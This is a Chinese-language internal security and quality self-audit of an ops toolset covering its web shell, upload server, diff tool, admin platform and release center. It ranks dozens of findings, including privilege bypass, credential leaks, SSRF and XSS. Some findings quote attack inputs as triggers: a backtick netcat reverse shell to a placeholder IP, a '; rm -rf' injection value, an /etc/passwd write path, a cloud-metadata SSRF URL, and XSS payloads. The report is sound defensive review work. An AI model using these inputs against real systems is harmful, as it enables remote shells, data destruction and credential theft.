# 运维工具集（ops_tools）代码自查报告

- 审查日期：2026-10-10
- 审查范围：`ops_tools/` 全量（约 26,400 行）
  - 公共层 `opslib/`（12 模块）、目标机服务 `tools/`（upload_server 3.3.0 / web_shell 1.3.0 / diff 2.0）
  - 管理机 `platform_console/`（ops_Platform 2.0.8 / release_center 1.3.2）
  - 6 套前端页面与 JS
- 方法：分领域静态审查（8 路并行）+ 对高风险点逐行复核；本机 Python 3.13 / Node 22 做片段验证
- 目标的真实运行环境：**Python 2.7.5（Linux 麒麟）**，本地开发为 Python 3.13（Windows）
- **修复进展**：见文末「七、修复进展」——P0 全部已修复并回归；P1 大部分已修复；P2 修了高价值一批，其余留存待排期。

严重度定义：
- **P0**：可被远程利用的安全缺陷，或线上（py2）必然崩溃 / 破坏核心功能
- **P1**：功能性错误（逻辑错、数据错、重复执行、凭据泄露、链路失效）
- **P2**：健壮性 / 资源 / 边界隐患，特定条件下才出问题

---

## 一、结论摘要

| 严重度 | 数量 | 典型影响 |
|---|---|---|
| P0 | 12 | 越权操作、任意文件写、命令执行白名单绕过、存储型 XSS、py2 崩溃、命令重复执行 |
| P1 | 26 | 参数丢失、连接池污染、哈希链断裂、后端能读但功能实际不可用、链路退化 |
| P2 | 41 | 线程/连接泄漏、缓存竞态、边界与编码隐患、并发写入冲突 |

**最需要立刻处理的三类：**
1. **授权边界形同虚设**：平台的「服务器列表/详情」接口与发布中心**完全没有调用** `Auth.can_access_server / filter_servers`，被限制到子集账号可越权操作任意服务器、执行命令、下载文件。
2. **两个「看起来已经修好、其实没生效」的链路**（本轮改造相关，已逐行复核）：
   - 平台 `raw_sse_proxy` 的 POST 请求体是 `str/unicode` 而非 `bytes` → py3 下 POST 通道必然抛错，py2 下非 ASCII 命令失败；**上游最终仍退化为 `GET ...?cmd=`**（正是 v2.0.7 想消除的 webshell 特征形态）。
   - 平台 `raw_sse_proxy` 与发布中心 `exec_on_target_stream` 的降级链**在「命令已经开始执行」时仍会重发**，非幂等步骤（重启服务、解包、数据库迁移）会被执行两次。
3. **py2 编码崩溃仍在多处潜伏**：`u''` 格式串混入字节串、含中文字面量 `% unicode` 等，会让本该 400 的参数校验变成 500、或让比对/导出功能整体不可用。

---

## 二、P0：安全问题与线上必崩

### A. 授权与凭据（横向越权 / 凭据泄露）

| # | 位置 | 问题 | 触发条件 | 影响 | 建议 |
|---|---|---|---|---|---|
| A1 | `ops_Platform.py:1487,1543,1552,1586,1609,1651,1692,1701,1723,1732,1798,1826,1868,1893,1930` | 所有**按名**接口只做 `find_server(name)`，**从不调用** `AUTH.can_access_server`；该函数只被列表类接口用到 | 管理员把某账号 `servers` 限制为 `['web-01']`，该账号直接请求 `/api/servers/db-02/exec`、`/download`、`/r/shell/...` | 横向越权：受限账号可对未授权服务器执行命令、下载/删除文件 | 抽 `_require_server(req, name)`，`find_server` 后统一校验；覆盖通用转发 `relay_handler` |
| A2 | `release_center.py:1645-1647,1718-1757,1766-1779` | 同上：`can_access_server / filter_servers` 在本文件**从未调用**，建单/执行/回滚都不校验目标机归属 | 受限用户创建发布单填写 `servers:["db-02"]` 并执行 | 可在未授权目标机执行任意步骤命令（含自定义 cmd / rollback_cmd） | 列表用 `filter_servers`，建单/执行/回滚逐台 `can_access_server` |
| A3 | `ops_Platform.py:1331,1490,1364,1520` | `dict(s)` 原样下发 `upload_token` / `shell_token`（目标机凭据），而接口权限仅 `server.view` | viewer 请求 `/api/servers` 或 `/api/servers/<name>` | 只读账号拿到全部目标机命令/上传凭据，可绕过平台直连目标机 | 无 `server.edit` 时剔除 token 字段（`settings_view` 已对 `release_pass` 脱敏，此处漏了） |
| A4 | `ops_Platform.py:2225-2236` | `/api/settings` 只清空 `release_pass`，**`release_token`（等价发布中心管理员）原样返回** | 任意登录用户 `GET /api/settings` | 泄露发布中心管理员令牌 | 非 `settings.edit` 用户同时清空 `release_token` |

### B. 命令执行与文件写入

| # | 位置 | 问题 | 触发条件 | 影响 | 建议 |
|---|---|---|---|---|---|
| B1 | `web_shell.py:299-302,330-334` | `$(...)` / 反引号被整体替换为占位符 `__SUBCMD__`，而 `check_policy` 对占位符直接 `continue` 跳过校验 | `--allow` 白名单下执行 `` $(id) ``、`` `nc 1.2.3.4 9001 -e /bin/sh` `` | **白名单形同虚设，可执行任意命令** | 占位符不得豁免；或直接拒绝任何 `$(...)`/反引号 |
| B2 | `upload_server.py:635-651`（消费点 1784/1693/1441） | `resolve_base_dir` 只校验「非空 + 绝对路径」，`/`、`/etc`、`C:\`、`\\?\`、UNC 全部放行，且不限定白名单根 | 开启 `--allow-client-dir` 后 `dir=/etc&filename=passwd`；**未设 token 时 `_auth` 直接放行**（`891-899`） | **任意路径写文件** | 限定 `dir` 必须位于允许根内，显式拒绝系统目录/盘符/UNC/`\\?\` |
| B3 | `release_center.py:1052,1076,1107,1219`（`subst`） | 发布单参数值未做 shell 转义即拼进目标机命令 | 参数填 `3.2.0; rm -rf ~/data` | 目标机任意命令执行 | 对注入值做白名单校验或按目标 shell 转义 |
| B4 | `release_center.py:1682-1692` | `api_servers_import` 的 `url` 取自请求体，服务端直接请求（token 也由调用方提供）；无协议/网段限制、无重定向禁用 | 提交 `url=http://169.254.169.254/...` | SSRF：以内网视角探测/访问任意 HTTP，并把响应回显 | 限制协议与网段，禁重定向，不回显原始 body |

### C. 前端 XSS（存储型为主）

| # | 位置 | 问题 | 触发条件 |
|---|---|---|---|
| C1 | `static/app.js:26`（`esc` 定义）；调用点 `284,328,342,1137,1143,1170,1190,1233` | `esc()` 用 `textContent→innerHTML`，**只转义 `& < >`，不转义引号**，却被大量用在双引号属性里 | 服务器名/应用名/参数 key 含 `"` → `data-name="a" onmouseover="alert(1)"` |
| C2 | `static/app.js:1234` | CMDB `group` 字段**完全未转义**直接拼 `<td>` | 服务器 `group` 设为 `<img src=x onerror=alert(1)>` |
| C3 | `static/app.js:1233` | 可编辑单元格 `value="…esc(val)…"`，`val` 用户可控且 `esc` 不转义引号 | 备注填 `" onmouseover="alert(1)` |
| C4 | `templates/release_center.html:245,246,259,271,272,293,443-446,711` | 内联 `onclick="editApp('` + `esc(name)` + `')"`：`esc` 把 `'`→`&#39;`，但属性解析时 `&#39;` 会**解码回 `'`**，`(` `)` `;` 未转义 | 应用名设为 `a');alert(1)//` |
| C5 | `templates/upload_server.html:1014` | 远端文件名拼进 `onclick`，`escapeHtml` 同样不转义引号 | 目标目录放名为 `x" onmouseover="alert(1)` 的文件 |
| C6 | `static/app.js:1265,1269`；`831` | 任务 `message`/`user`、订单 id 未转义或经 `esc` 进内联 `onclick` | 远端命令回显、上游产生的订单 id |

> 共同根因：只有「文本转义」函数，没有「属性/JS 字符串」转义。建议新增 `attr()`（转义 `& " ' < >`）+ 事件委托 + `dataset`，禁止把数据拼进内联 `onclick`。

### D. py2（线上）必然崩溃 / 核心功能不可用

| # | 位置 | 问题 | 触发条件 | 影响 |
|---|---|---|---|---|
| D1 | `tools/diff_file_dir_jar_excel.py:418`（崩溃点 441） | `_side_by_side_html` 的 `out` 混装 unicode 与**含中文的字节串**（`'… 折叠 %d 行相同内容 …'`），py2 `join` 时按 ascii 解码字节串 | 任意一次文本比对（几乎必现 skip 行） | 文本/jar/docx/pptx 比对全部 500 |
| D2 | 同上 `1484,1486,1487,1533-1536,1566` | 报告导出格式串是含中文的字节串，插值却是 `esc_html()`（py2 返回 unicode） | `POST /api/export/report`（html/md） | 差异导出 100% 不可用 |
| D3 | 同上 `487,496,585,594,718,720,767,769,795,901,1939` | 本文件自带的 `safe_str/to_text` 在 py2 返回 **unicode**（与 `opslib.compat` 语义相反），于是 `"路径不存在：%s" % p` 全部崩溃 | 传不存在的路径 / 非 zip / 越界路径等**任何友好报错分支** | 本应 400 的提示变成 500 HTML，前端报「响应不是 JSON」 |
| D4 | `upload_server.py:650` | `'dir 必须是绝对路径（收到: %s）' % client_dir`：中文字节串 `%` unicode（`dir` 来自 `json.loads`） | py2 下 `chunk/init` 传非绝对 `dir` | 400 变 500 |
| D5 | `web_shell.py:1045` | SSE 路径 `compat.popen_stream(cmd, ...)` 未 `to_bytes`（对比阻塞路径 367-368 已转） | py2 下执行含中文的命令（POST / 券入口） | SSE 已发 200 后抛错，流中断 |
| D6 | `ops_Platform.py:1143-1153` | `csv_response` 用 `io.StringIO` + `csv.writer`：py2 的 `_io.StringIO.write` 只收 unicode，而 `_csv` 写的是 `str`（bytes） | py2 下 `/api/cmdb/export`、`/api/audit/export.csv` | 导出接口 500 |
| D7 | `release_center.py:221,167` | `u'未知参数: %s' % compat.safe_str(k)`：`u''` 格式串配 `safe_str`（py2 返回字节串） | 创建发布单传非 ASCII 参数 key | 400 变 500 |

---

## 三、P1：功能性错误

### E. 本轮改造相关（已逐行复核，优先）

| # | 位置 | 问题 | 触发条件 | 影响 |
|---|---|---|---|---|
| E1 | `ops_Platform.py:1841` + `1108-1112` | POST 体是 `compat.to_text(compat.json_bytes(...))`（str/unicode），`raw_sse_proxy` 直接用 `conn.send(body)`：py3 下 `sendall(str)` 抛 `TypeError`；py2 下 unicode 命令隐式 ascii 编码失败 | 任意一次终端命令执行 | **POST 通道实际不可用**；上游最终仍以 `GET ...?cmd=` 形态被访问（v2.0.7 目标未达成），且上游会收到「声明了 Content-Length 却无 body」的畸形请求。修法：`body = compat.json_bytes({...})` |
| E2 | `ops_Platform.py:1117-1134` + `1843-1846` | `raw_sse_proxy` 在**已经向客户端写过事件之后**仍可能 `return False`（readline 超时/异常），调用方据此再走 GET 或同步 | 命令静默超过 120s（`sleep 300 > /dev/null`）或上游半死连接 | 同一 SSE 混入两段输出；**命令被重复执行**（GET 是对上游的第二次请求）。注释声称「只在未写过字节时返回 False」与实际不符 |
| E3 | `ops_Platform.py:1117-1123` | 上游 EOF 后 `resp.fp.readline()` 返回 `b''`，进入 `if not raw: sleep(0.05); continue`；而 `stream.closed` 只在写失败时置位、此处不再写 → **永不退出** | 命令/发布执行结束、客户端 EventSource 仍连接 | 处理线程以 20Hz 死循环永久持 socket 与上游连接（`api_server_exec_stream` / `release_handler` 两条路径同源），**线程与连接泄漏** |
| E4 | `release_center.py:693` | 同步降级条件是 `if not ok or state['code'] is None:`，**未受 `seen['any']` 保护**（`seen` 只保护了 687 行的 POST→GET） | POST 流已推出若干 `out` 事件、但流在 `exit` 前断开 / idle 超时 | **命令被第二次执行**（同步 `/api/exec`）。对 `@stop/@replace/@start` 重启类步骤造成双份副作用。修法：`if (not ok or state['code'] is None) and not seen['any']:` |
| E5 | `ops_Platform.py:282-292` | 平台自有 `_take_conn` 复用连接时**未重设 socket 超时**（`opslib/httpx` 已在 v1.0.5 修，此处未同步） | `relay_handler` 的 chunk 上传用 `timeout=3600`，普通删除用 30s，打到同一 `upload_port` | 3600s 连接被 30s 请求复用 → 上游 hang 时线程卡近 1 小时；或大文件上传在 60s 处被读超时打断（现场「上传莫名失败」放大源） |

### F. 公共层（opslib，已逐行复核）

| # | 位置 | 问题 | 触发条件 | 影响 |
|---|---|---|---|---|
| F1 | `opslib/task.py:129`（存 params）+ `322`（`result = fn(ctx)`） | `submit` 把 `params` 存进任务记录，但工作线程**只调 `fn(ctx)`，从不把 params 作为 kwargs 传入** | 任何 `/api/servers/bulk-exec`、`/api/cmdb/collect` | `bulk-exec` 以 `cmd=''` 对全部 shell 服务器下发**空命令**且忽略选择器；`cmdb/collect` 永远全量采集。（同文件 `api_server_exec_async` 用闭包捕获参数是正确的，证明此处是误用） |
| F2 | `opslib/auth.py:287-319` | `user_update` 拿到的是**缓存对象的引用**，在 `check_password_strength` 失败**提前 return 之前**就已就地改了 `target['role']` 等字段；改动留在内存，未落盘 | `user_update('bob', {'role':'admin','password':'1'})`（口令太短） | 返回失败但内存里 bob 已是 admin；随后任何一次 `users` 落盘（如 login 更新 last_login）都会**把越权角色持久化** |
| F3 | `opslib/audit.py:113-118` | `entry['hash']` 先赋值给 `self._last_hash`，之后 `log.append(entry)` 失败只记日志 | 磁盘满 / 权限不足导致一次 append 失败 | `_last_hash` 指向未落盘的 hash → 之后 **`verify()` 哈希链永久断裂** |
| F4 | `opslib/httpx.py:229,233` | `raw = resp.read(max_body)`（默认 64MB 上限）截断后，仍把连接放回池（200≤status<500）；而 `_conn_usable` 用 `MSG_PEEK` 看到残留数据**反而判为「可用」** | 上游返回 >64MB 的响应体（大文件、大列表）后复用该连接 | 下次请求读到上一个响应的残留 body → 解析错乱 / 请求走私面 |
| F5 | `ops_Platform.py:337-379`（`relay_request`） | attempt=0 失败后 `except` 里把 `src`（rfile）**排空**，attempt=1 又 `remaining=src_len` 从已耗尽的 `src` 读 | 流式转发上传时首条池连接是陈旧 keep-alive | 重试发出 **0 字节 body** 但头声明 `src_len` → 上游挂起 / 协议错，上传静默损坏 |
| F6 | `opslib/store.py:36,191` | 原子写固定用 `path + '.tmp'` 后缀（无进程内锁保护 `atomic_write_json` 本身），跨进程/多实例共享同一文件会互相覆盖 | 两个服务实例共享同一数据文件 | 写入内容被覆盖，可能出现半截文件 |

### G. 目标机服务

| # | 位置 | 问题 | 触发条件 | 影响 |
|---|---|---|---|---|
| G1 | `upload_server.py:846-847,891-899` 等 | HTTP/1.1 keep-alive 下，鉴权失败/参数错误等**早退分支不排空请求体**也不关连接 | 同连接先发带 body 的错误请求（401），紧接下一请求 | 残留 body 被当作下一请求行 → 偶发解析错乱（请求走私面） |
| G2 | `web_shell.py:643-645` | `code = -1 if not session.proc.returncode else session.proc.returncode`：`returncode==0` 时 `not 0` 为真 → 返回 -1 | 会话内命令以退出码 0 结束（`exit`） | `/api/sessions/<id>/exec` 返回错误返回码 |
| G3 | `upload_server.py:1521-1523,1599-1615` | `handle_chunk_upload` 不读任务 `total_chunks` 做上界校验（仅查 `0<=index<10000`） | 对 `total_chunks=2` 的任务上传 `index=9999` | chunkfile 留垃圾分片；offset 模式 `seek(9999*chunk_size)` 真实分配可达 TB 级 → 撑爆磁盘 |
| G4 | `upload_server.py:1234-1237` | 下载中途 `OSError` 后再调 `_send_json(500,...)`，但响应头与部分 body 已发出 | 传输中磁盘读错误 | 同一连接写第二个响应 → `ERR_INVALID_RESPONSE` |
| G5 | `upload_server.py:932-934,980-994` | `/api/status` 未鉴权（`/api/list`、`/api/tree` 都调了 `_auth()`） | 无 token 直接 GET | 泄露绝对上传目录、PID、磁盘容量、文件数、版本 |
| G6 | `upload_server.py:654-683` | `resolve_chunk_save_path` 只删 `..`，落盘不走 `is_within(realpath)`；`os.path.join(root, 'C:/x')` 在 Windows 会覆盖 root | 存储根内存在指向外部的软链目录；或 Windows 下 `relative_path="C:/x"` | 写出存储根之外 |
| G7 | `upload_server.py:1202-1215` | `Range: bytes=-N`（后缀区间）被当作 `start=0,end=N` | 请求 `bytes=-10`（100 字节文件） | 断点下载取到错误区间（应 90-99），文件损坏 |
| G8 | `upload_server.py:1883-1898` | 批量打包下载 `os.walk` 不过滤 `hidden_entry`（`.tmp`） | `paths=.tmp` | 打包下载未合并的分片与断点记录 |
| G9 | `web_shell.py:1121-1133` | `with SESSIONS_LOCK:` 内 `Session(...)`（fork/exec + 起线程）并 `_send_json`，锁内做慢 IO；`Session` 抛异常直接逃出处理器 | 并发创建会话 / 子进程启动失败 | 会话表被阻塞；失败无统一 500 而是 traceback + 连接重置 |
| G10 | `upload_server.py:1706,1736` | `complete` 用 `os.path.isfile(data)` 判定落盘模式（而非 meta 记录）；成功后 `rmtree` 任务目录，重复 complete 返回 404（其实已成功） | 任务目录残留 `data` 文件 / 客户端 complete 超时重试 | 可能落错内容；调用方把「已成功」误判为失败 |
| G11 | `web_shell.py:322-325` | 黑名单为**子串匹配** | `rm -fr /`、`rm  -rf  /` | 危险命令黑名单基本无效（应视为兜底，安全边界靠白名单 + 最小权限） |
| G12 | `opslib/compat.py:613-619,373,446` | `preexec_fn=os.setsid` 在多线程服务中 fork 不安全；`Popen` 后子进程在新会话/新进程组 | 高并发执行命令/建会话 | 偶发 fork 死锁（Python 官方明确警告） |

---

## 四、P2：健壮性 / 资源 / 边界

### H. 公共层

| # | 位置 | 问题 |
|---|---|---|
| H1 | `server.py:138,182` | `_responded` 是实例标志，keep-alive 多请求间**不重置**：第一个请求正常响应后，第二个请求若异常会直接 `close_connection` 而不回 500 → 客户端拿到空响应 |
| H2 | `sse.py:410-422` | `gen()` 内对闭包变量 `last` 赋值却无 `nonlocal` → `timeout>0` 时首次 1s 空闲即 `UnboundLocalError`（当前 3 处调用均为 `timeout=0`，短路不触发；**属潜伏缺陷**） |
| H3 | `crypto.py:139` | `decrypt` 写死 `ITERATIONS`，忽略 `encrypt(iterations=...)` 自定义值，且密文格式不存迭代数 → 非默认迭代加密的数据永远解不开 |
| H4 | `crypto.py:125-126,150` | `plain:` 前缀直接返回明文（允许明文凭据落盘）；`Vault.decrypt` 失败静默返回 `''`，掩盖解密失败 |
| H5 | `compat.py:665-671` | `run_cmd` 的 reader 只 `read(max_output+1)` **一次**，输出超限时剩余输出填满管道 → 子进程写阻塞、一直憋到超时被 kill（输出不全 + 白等满超时） |
| H6 | `compat.py:309-318` | `is_within` 只 `abspath` 不 `realpath` → 符号链接可绕过（G6 的根因之一） |
| H7 | `compat.py:27` | `DEVNULL = open(os.devnull,'wb')` 模块级句柄，永不关闭 |
| H8 | `store.py:20-30,88-100` | `_LOCKS` 按 path 无限累积；`JsonStore.load()` 在 mtime 未变时返回**缓存对象引用**，调用方随手一改即污染缓存（F2 的根因） |
| H9 | `store.py:154-161,197-212` | `JsonlLog.append` 非跨进程原子；`trim` 计数与 rewrite 之间无锁 → 期间的新增行可能丢失 |
| H10 | `auth.py:436` | `resolve()` 每请求 `sessions.load()`（可能读文件 + JSON 解析），高频下开销明显；`last_seen` 每 60s 触发一次全量落盘 |
| H11 | `auth.py:189-192` | `check_password_strength` 只校验长度 ≥6，无复杂度/弱口令检查 |
| H12 | `task.py:254-267,269-275` | `list()` / `stats()` 不加锁遍历共享 list，并发时可能 `RuntimeError`；`_publish` 在锁外 `dict(task)`（浅拷贝）与写线程并发 |
| H13 | `task.py:89-93` | `_save` 的 1s 节流判断与 `_last_save` 赋值在锁外，并发时可能丢最后一次非强制保存（终态用 force=True，影响有限） |
| H14 | `server.py:91-101,385-391` | `_TEXT_CACHE` 无锁；`serve_static` 对非文本文件整文件读入内存（大媒体文件占内存） |
| H15 | `server.py:163-167` | CORS 回显任意 `Origin` 且 `Allow-Credentials: true`（本项目用 header token，风险有限，但建议收敛白名单） |
| H16 | `apibase.py:276-282` | `form()` 用 `raw.decode('utf-8','ignore')` 而非 `compat` 归一，py2 下得到 unicode 键值，可能与中文字面量格式化冲突 |
| H17 | `apibase.py:307-334` | `stream()` 异常时只置 `close_connection`，**不调用 `iterator.close()`** → 上游连接/文件句柄依赖 GC 回收 |

### I. 管理平台 / 发布中心

| # | 位置 | 问题 |
|---|---|---|
| I1 | `ops_Platform.py:658-680,729` | `_probe_key` 只含 `name/host/type/upload_port/shell_port`（缺 `metrics_port/access_mode/token`），且用 `\|` 拼接而服务器名未禁用 `\|` → 可能撞 key 或 `invalidate_probe` 匹配错乱；更新与探测并发时旧结果可在失效后回填 |
| I2 | `ops_Platform.py:1424,2206` | `req.json() if req.headers.get('Content-Length') else {}`：`'0'` 为真 → 空体 POST 被 `json()` 判 400（批量探测/通知自测失败） |
| I3 | `ops_Platform.py:2130-2131` | `/api/audit?start=abc` 直接 `float()`，无 try → 500 |
| I4 | `ops_Platform.py:1927` | 通用转发权限 `'file.write' if kind=='upload' else 'cmd.exec'` 不区分 GET/写 → 只读账号经 `/r/upload/...` 下载也被 403，与 `/download`（`file.read`）语义不一致 |
| I5 | `ops_Platform.py:1050-1073` | `release_upload_proxy` 失败分支不排空请求体 → keep-alive 连接污染 |
| I6 | `ops_Platform.py:1781-1791` | 执行券**先 `pop` 再校验来源 IP** → 反向代理/多出口 NAT 下 XFF 不一致时券被误焚，合法取流 403 且无法重试 |
| I7 | `ops_Platform.py:1644,1685` | `_RelayBody` 在客户端中断时未 `close()`，上游连接靠 GC 回收 |
| I8 | `release_center.py:1023-1026,1113-1116` | Windows 备份/回滚命令退出码未归一：`&` 链的退出码 = robocopy 原始码（1~7 都算成功）→ 备份成功却被判失败、触发无谓回滚 |
| I9 | `release_center.py:1037-1038` | POSIX 备份 `cp ... 2>/dev/null \|\| true` **吞掉所有失败** → 备份为空却记成功；后续失败回滚时用残缺备份覆盖目标目录 |
| I10 | `release_center.py:1225,1253-1298` | 只捕 `StepFailed`；`os.path.getsize` 等非 `StepFailed` 异常逃逸 → 发布单**永久卡在 `running`**、不回滚、此后 409 无法重跑 |
| I11 | `release_center.py:1771-1775` | `api_orders_run` 的「running」检查与置位不在同一临界区（置位在任务线程里）→ 连点「执行」可**并发跑两遍**，且记录只留一份 |
| I12 | `release_center.py:1113-1121` | 回滚只是覆盖（`robocopy /E`、`cp -a`），不删除「新版本新增、旧备份没有」的文件 → 回滚后是混合态。建议 `/MIR` / `rsync --delete` |
| I13 | `release_center.py:1295-1296,1188` | 并行发布的 `order` 字典与 `done[0]` 无锁（`save_order` 边序列化边被 `append_run` 修改）→ 可能 `RuntimeError`，叠加 I10 卡死 |
| I14 | `release_center.py:273,527-539` | `ORDER_EVENTS` 按 order 累积且**从不清除**；`step['logs']` 全量写进 `orders.json` → 内存与文件持续膨胀 |
| I15 | `release_center.py:1346-1351,1781-1792` | 手动回滚的变量 `mapping` 漏 `app.vars` / `order.params`，且不校验「是否正在运行」→ 回滚命令变量为空 / 与自动回滚互相踩状态 |
| I16 | `release_center.py:1180-1183,1794-1808` | 取消只在步骤循环顶部检测，**不执行回滚**，也不把当前 step 置为非 running → 目标机可能停在「已停服/已替换」且显示残留 `running` |
| I17 | `release_center.py:1581-1593` | 上传查重（`find_package_by_md5`）在锁外，与改名/写索引非同一临界区 → 并发相同包各插一条，`skip_dup` 失效（TOCTOU） |
| I18 | `release_center.py:934-940,1568-1575` | 远端 MD5 取不到时仅记日志就放行（完整性校验形同虚设）；`except Exception` 把 413 重新包成 500 |
| I19 | `release_center.py:1911` | `ARGS = parse_args()` 在导入时执行，作为库导入有副作用（影响可测试性） |

### J. 目标机服务与比对工具

| # | 位置 | 问题 |
|---|---|---|
| J1 | `upload_server.py:1617-1632` | `_save_chunk_legacy` 不校验实际写入长度（chunkfile 分支有校验）→ 截断分片仍被 `mark_done`，complete 拼出损坏文件 |
| J2 | `upload_server.py:1291-1297` | `/api/control` 读请求体无大小上限 → 内存耗尽 |
| J3 | `upload_server.py:1318-1327,182` | 表单上传依赖 `cgi`（py3.13 已移除）且 `--max-upload-mb` 默认 0（不限）→ 磁盘 DoS |
| J4 | `upload_server.py:634,650` | `--allow-client-dir` 的 `dir` 校验与错误提示的 py2 编码问题（见 D4） |
| J5 | `web_shell.py:373,446` | `preexec_fn=os.setsid`（同 H12 / G12） |
| J6 | `diff_*.py:326-335` | `read_text_lines` 整文件读入内存且无上限（上传上限 200MB）→ 大文件 OOM |
| J7 | `diff_*.py:841` | Jar/Zip 条目「相同」仅凭 CRC32 + size，存在碰撞 → 内容不同的条目被静默判为「相同」（diff 工具最危险的一类错） |
| J8 | `diff_*.py:801,1862,899,904` | 解压防护依赖**可伪造的中央目录 `file_size`**；嵌套归档无条目数上限；`resolve_zip_chain` 异常路径不 `close()` → zip 炸弹 / 句柄泄漏 |
| J9 | `diff_*.py:513-540,1647-1663,1718-1743` | 上传产生的临时目录在异常路径（`new_session` 之前抛错）不清理 → 磁盘堆积 |
| J10 | `diff_*.py:2001,2005` | `api_compare_excel` 重复 `new_session`（第一次返回值被丢弃）→ 孤儿会话超时时 `rmtree` 掉仍在用的临时目录 |
| J11 | `diff_*.py:1678-1682` vs `1869` | 「自定义忽略正则」在顶层走 glob 编译、在展开嵌套时走真正则 → 同一规则两种语义 |
| J12 | `diff_*.py:330-335` | 文本比对用 `utf-8` 而非 `utf-8-sig` → BOM 差异产生假差异 |
| J13 | `diff_*.py:332,335,775` | `splitlines()` 丢失尾部换行差异，并把 `\v \f \x85 \u2028 \u2029` 当行边界 |
| J14 | `diff_*.py:1052` | PPTX 幻灯片按**字典序**排序（`slide10` 排在 `slide2` 前）→ 报告编号错位 |
| J15 | `diff_*.py:1315-1318` | Excel 三向比对 `get_eq` 恒返回 `None` → `common_conflict` 恒为 0，「共同(冲突)」永不显示 |
| J16 | `diff_*.py:466-469` | `filecmp.cmp` 的 `(size,mtime)` 缓存 → 覆盖写入但大小/时间戳不变时判「相同」 |
| J17 | `diff_*.py:598-633` | `_SESSIONS` 无容量上限、保存整份结果、只在新建会话时清理 → 内存持续增长 |
| J18 | `diff_*.py:1384-1405` | `append_history` 与 `delete_history`（整体重写）无文件锁 → 并发时丢记录 |
| J19 | `diff_*.py:376,356` | `SequenceMatcher(autojunk=False)` + 20000 行上限 → 高度相似的重复行文本最坏 O(n²)，阻塞 worker |
| J20 | `diff_*.py:2169-2178` | `app.run(debug=debug)` 受 `FLASK_DEBUG` 控制（置 1 会回显堆栈）；除一个 API 外均无 `try/except`，也无 500 JSON errorhandler |

### K. 前端

| # | 位置 | 问题 |
|---|---|---|
| K1 | `app.js:65,147,507,509,580-595,1108,1242,1259,1271`；`diff_*.html:364-367,862,957-958`；`release_center.html:340` | **token 出现在 URL**（`EventSource`/`window.open`/`tokenQuery`）→ 落入反向代理、access log、浏览器历史、Referer。建议改 `fetch`+流 + `X-Auth-Token`（`web_shell.html:203` 已是正确示范），或一次性 ticket |
| K2 | `app.js:549` | `JSON.parse(localStorage)`（顶层，无 try）→ `ops_hist` 损坏时整个 SPA 白屏且每次刷新复现 |
| K3 | `app.js:531,539` | 取消上传后，进行中的 `initItem` 仍会 `state='uploading'` → 已取消文件继续上传（状态机破坏） |
| K4 | `app.js:1105-1128,1262-1271` | `orderES`/`taskES` 不随视图切换关闭；`onerror` 只重拉快照、不重建连接 → 连接泄漏 + 实时输出中断 |
| K5 | `app.js:1265,1267` | 任务项同时有行内 `onclick` 与容器事件委托 → `openTask` 被调用两次（重复请求 + 快速开关 ES） |
| K6 | `app.js:1271` | 任务详情每条 SSE 都 `innerHTML` 重建**全部**日志 DOM → O(n²)，大日志卡死 |
| K7 | `app.js:473,1213,1246,1268` | 无请求序号 / AbortController → 快速切换时旧响应覆盖新响应 |
| K8 | `app.js:1246-1247` | 审计过滤变更不重置 `auditPage` → 第 3 页改条件后查空 |
| K9 | `app.js:1219` | CMDB 分组下拉从未填充，且 `if(!$('cmdbGroup').options.length>1){}` 是空语句死代码 |
| K10 | `app.js:88` | `toggleUserMenu` 被 `platform.view` 拦截 → 缺该权限的账号**无法从 UI 登出** |
| K11 | `diff_*.html:858-899` | SSE 失败降级为无上限轮询且 `onerror` 不 `es.close()` → 重复 `setInterval` + 请求风暴 |
| K12 | `diff_*.html:955-959` | 「导出报告/补丁」用 **GET** 且未带 `compare_id`（后端要求 POST + JSON body）→ 导出功能从页面完全不可用 |
| K13 | `diff_*.html:472,627,687,799` | 服务端生成的 diff HTML 直接 `innerHTML`（依赖服务端转义，前端无二次防护） |
| K14 | `diff_*.html:675` | `renderOoxmlResult` 先写 `note` 再被 `h` 整体覆盖 → note 丢失 |
| K15 | `index.html:430` | `window.needLogin={{need_login}};` 若注入非布尔字符串（如 `"false"`）会被判为真值 |

---

## 五、建议修复顺序

**第一优先（安全，可远程利用）**
1. B1 命令白名单 `$(...)`/反引号绕过
2. B2 `--allow-client-dir` 任意路径写（含未设 token 直接放行）
3. A1 / A2 按服务器授权未落地（横向越权）
4. A3 / A4 凭据泄露
5. C1-C6 前端 XSS（统一 `attr()` + 事件委托）
6. B3 / B4 命令注入与 SSRF

**第二优先（线上必崩 / 本轮改造失效）**
7. E1（POST 体转 bytes）—— 直接决定 v2.0.7 的 webshell 误报治理是否真的生效
8. E2 / E4（命令重复执行）—— 非幂等步骤会造成生产事故
9. D1-D7（py2 编码崩溃：diff 比对与导出、上传目录错误提示、SSE 中文命令、CSV 导出）
10. E3（线程泄漏）、F1（任务参数丢失）—— 影响面最广的两条功能错误

**第三优先（功能正确性）**
11. F2 / F3（越权角色残留、审计链断裂）、F4 / F5 / E5（连接池污染与超时复用）
12. G1-G12、I8-I19

**第四优先（健壮性）**
13. H 组与 J/K 组按触发频率排期

---

## 六、本次自查的两点重要提醒

1. **现有回归存在盲区**：`verify_integration.py` 的「平台：转发 web_shell 走 POST（URI 无命令）」检查的是**日志里出现了 `POST /api/exec/stream` 这一行**。而 E1 表明该 POST 的**请求体并未成功发送**（py3 下 `conn.send(str)` 抛错）——请求行已发出，所以断言通过，但通道实际未生效。**建议把断言改为**：校验上游确实收到完整命令（例如用一个会回显命令的探针命令并检查输出），或校验链路最终形态不含 `?cmd=`。
2. **P0/P1 中标注了「已逐行复核」的条目**（E1-E5、F1-F6、A 组关键项）我本人在代码中确认过行号与逻辑；其余（G/I/J/K 组及 B 组部分）来自静态审查，行号与结论可信度高，但建议在修复前用最小用例复现一次再动手，避免误伤。

---

## 七、修复进展

> 更新时间：2026-10-10（本轮「自查 + 修复」）。所有已修复项均通过下列回归：`opslib/selftest.py`（114）、`verify_py2_compat.py`（34）、`verify_py2_excepts.py`、`verify_integration.py`（212）、`verify_upload_perf.py` / `verify_upload_speed.py`、`verify_web_shell_v12.py`（full 28 / whitelist 5）、`verify_diff_v2.py`（32）、`verify_diff_security.py`（6）、`verify_v2.py`，以及 `py_compile`（Py3.13）与 Node `--check`。

### 7.1 已修复

| 组 | 已修复条目 | 要点 |
|---|---|---|
| P0-A | A1 A2 A3 A4 | 抽 `require_server` / `require_targets` 统一授权；服务器列表与详情凭据脱敏；settings 同时清 `release_token` |
